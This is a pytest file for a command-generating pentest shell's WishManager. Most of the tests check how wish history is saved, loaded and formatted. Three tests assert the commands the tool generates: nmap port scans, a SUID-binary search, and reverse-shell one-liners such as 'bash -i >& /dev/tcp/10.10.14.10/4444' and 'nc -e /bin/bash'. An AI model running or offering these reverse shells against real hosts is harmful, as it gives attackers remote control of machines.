"""Tests for WishManager command generation and history management."""

import json
from unittest.mock import mock_open, patch

import pytest
from wish_models import UtcDatetime, Wish, WishState

from wish_sh.test_factories import WishManagerFactory


class TestWishManagerCommands:
    """Test WishManager command generation and history management."""

    def test_generate_commands_scan_port(self):
        """Test generate_commands with 'scan port' wish text.

        This test verifies that the generate_commands method returns appropriate
        commands when the wish text contains 'scan' and 'port'.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Generate commands for a wish about port scanning
        wish_text = "scan ports on 10.10.10.40"
        commands = wish_manager.generate_commands(wish_text)

        # Verify the generated commands
        assert len(commands) == 2
        assert "sudo nmap -p- -oA tcp 10.10.10.40" in commands
        assert "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40" in commands

    def test_generate_commands_find_suid(self):
        """Test generate_commands with 'find suid' wish text.

        This test verifies that the generate_commands method returns appropriate
        commands when the wish text contains 'find' and 'suid'.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Generate commands for a wish about finding SUID binaries
        wish_text = "find suid binaries"
        commands = wish_manager.generate_commands(wish_text)

        # Verify the generated commands
        assert len(commands) == 1
        assert "find / -perm -u=s -type f 2>/dev/null" in commands

    def test_generate_commands_reverse_shell(self):
        """Test generate_commands with 'reverse shell' wish text.

        This test verifies that the generate_commands method returns appropriate
        commands when the wish text contains 'reverse shell'.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Generate commands for a wish about reverse shell
        wish_text = "create a reverse shell to 10.10.14.10"
        commands = wish_manager.generate_commands(wish_text)

        # Verify the generated commands
        assert len(commands) == 3
        assert any("bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'" in cmd for cmd in commands)
        assert any("nc -e /bin/bash 10.10.14.10 4444" in cmd for cmd in commands)
        assert any("python3 -c" in cmd and "10.10.14.10" in cmd for cmd in commands)

    def test_generate_commands_default(self):
        """Test generate_commands with default case.

        This test verifies that the generate_commands method returns default
        commands when the wish text doesn't match any specific patterns.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Generate commands for a generic wish
        wish_text = "show me the current directory"
        commands = wish_manager.generate_commands(wish_text)

        # Verify the generated commands
        assert len(commands) == 3
        assert f"echo 'Executing wish: {wish_text}'" in commands
        assert f"echo 'Processing {wish_text}' && ls -la" in commands
        assert "sleep 5" in commands

    def test_save_wish(self):
        """Test save_wish method.

        This test verifies that the save_wish method correctly serializes and
        saves a wish to the history file.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Create a wish to save
        wish = Wish.create("Test wish")
        wish.state = WishState.DONE
        wish.finished_at = UtcDatetime.now()

        # Mock the open function
        with patch("builtins.open", mock_open()) as mock_file:
            # Call save_wish
            wish_manager.save_wish(wish)

            # Verify that open was called with the correct path and mode
            mock_file.assert_called_once_with(wish_manager.paths.history_path, "a")

            # Verify that the wish was serialized and written to the file
            file_handle = mock_file()
            file_handle.write.assert_called_once()

            # Check that the written data is valid JSON containing the wish
            written_data = file_handle.write.call_args[0][0]
            assert wish.wish in written_data
            assert wish.state in written_data

            # Verify that we can parse the written data as JSON
            try:
                json_data = json.loads(written_data)
                assert json_data["wish"] == wish.wish
                assert json_data["state"] == wish.state
                assert json_data["id"] == wish.id
            except json.JSONDecodeError:
                pytest.fail("Written data is not valid JSON")

    def test_load_wishes_success(self):
        """Test load_wishes method with successful file read.

        This test verifies that the load_wishes method correctly loads and
        deserializes wishes from the history file.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Create sample wish data
        wish1 = {
            "id": "wish-123",
            "wish": "Test wish 1",
            "state": WishState.DONE,
            "created_at": "2023-01-01T12:00:00Z",
            "finished_at": "2023-01-01T12:05:00Z"
        }
        wish2 = {
            "id": "wish-456",
            "wish": "Test wish 2",
            "state": WishState.FAILED,
            "created_at": "2023-01-02T12:00:00Z",
            "finished_at": "2023-01-02T12:05:00Z"
        }

        # Mock the open function to return sample wish data
        mock_file_content = f"{json.dumps(wish1)}\n{json.dumps(wish2)}\n"
        with patch("builtins.open", mock_open(read_data=mock_file_content)) as mock_file:
            # Call load_wishes
            wishes = wish_manager.load_wishes(limit=2)

            # Verify that open was called with the correct path and mode
            mock_file.assert_called_once_with(wish_manager.paths.history_path, "r")

            # Verify that the correct number of wishes was loaded
            assert len(wishes) == 2

            # Verify that the wishes were loaded in reverse order (newest first)
            assert wishes[0].id == wish2["id"]
            assert wishes[0].wish == wish2["wish"]
            assert wishes[0].state == wish2["state"]

            assert wishes[1].id == wish1["id"]
            assert wishes[1].wish == wish1["wish"]
            assert wishes[1].state == wish1["state"]

    def test_load_wishes_file_not_found(self):
        """Test load_wishes method when the history file doesn't exist.

        This test verifies that the load_wishes method returns an empty list
        when the history file doesn't exist.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Mock the open function to raise FileNotFoundError
        with patch("builtins.open", side_effect=FileNotFoundError):
            # Call load_wishes
            wishes = wish_manager.load_wishes()

            # Verify that an empty list was returned
            assert wishes == []

    def test_load_wishes_invalid_json(self):
        """Test load_wishes method with invalid JSON in the history file.

        This test verifies that the load_wishes method returns an empty list
        when the history file contains invalid JSON.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Mock the open function to return invalid JSON
        with patch("builtins.open", mock_open(read_data="invalid json\n")):
            # Call load_wishes
            wishes = wish_manager.load_wishes()

            # Verify that an empty list was returned
            assert wishes == []

    def test_format_wish_list_item_done(self):
        """Test format_wish_list_item with a completed wish.

        This test verifies that the format_wish_list_item method correctly
        formats a completed wish for display.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Create a completed wish
        wish = Wish.create("Test wish")
        wish.state = WishState.DONE
        wish.created_at = "2023-01-01T12:00:00Z"
        wish.finished_at = "2023-01-01T12:05:00Z"

        # Format the wish
        formatted = wish_manager.format_wish_list_item(wish, 1)

        # Verify the formatted string
        assert "[1]" in formatted
        assert "wish: Test wish" in formatted
        assert "started at 2023-01-01T12:00:00Z" in formatted
        assert "done at 2023-01-01T12:05:00Z" in formatted

    def test_format_wish_list_item_in_progress(self):
        """Test format_wish_list_item with an in-progress wish.

        This test verifies that the format_wish_list_item method correctly
        formats an in-progress wish for display.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Create an in-progress wish
        wish = Wish.create("Test wish in progress")
        wish.state = WishState.DOING
        wish.created_at = "2023-01-01T12:00:00Z"

        # Format the wish
        formatted = wish_manager.format_wish_list_item(wish, 2)

        # Verify the formatted string
        assert "[2]" in formatted
        assert "wish: Test wish in progress" in formatted
        assert "started at 2023-01-01T12:00:00Z" in formatted
        assert "DOING" in formatted
        assert "done at" not in formatted

    def test_format_wish_list_item_long_wish(self):
        """Test format_wish_list_item with a long wish text.

        This test verifies that the format_wish_list_item method correctly
        truncates long wish texts.
        """
        # Create a WishManager
        wish_manager = WishManagerFactory.create()

        # Create a wish with a long text
        long_text = "This is a very long wish text that should be truncated in the formatted output"
        wish = Wish.create(long_text)
        wish.state = WishState.DOING
        wish.created_at = "2023-01-01T12:00:00Z"

        # Format the wish
        formatted = wish_manager.format_wish_list_item(wish, 3)

        # Verify the formatted string
        assert "[3]" in formatted
        assert long_text[:30] in formatted  # First 30 characters
        assert "..." in formatted  # Truncation indicator
        assert "started at 2023-01-01T12:00:00Z" in formatted
        assert "DOING" in formatted
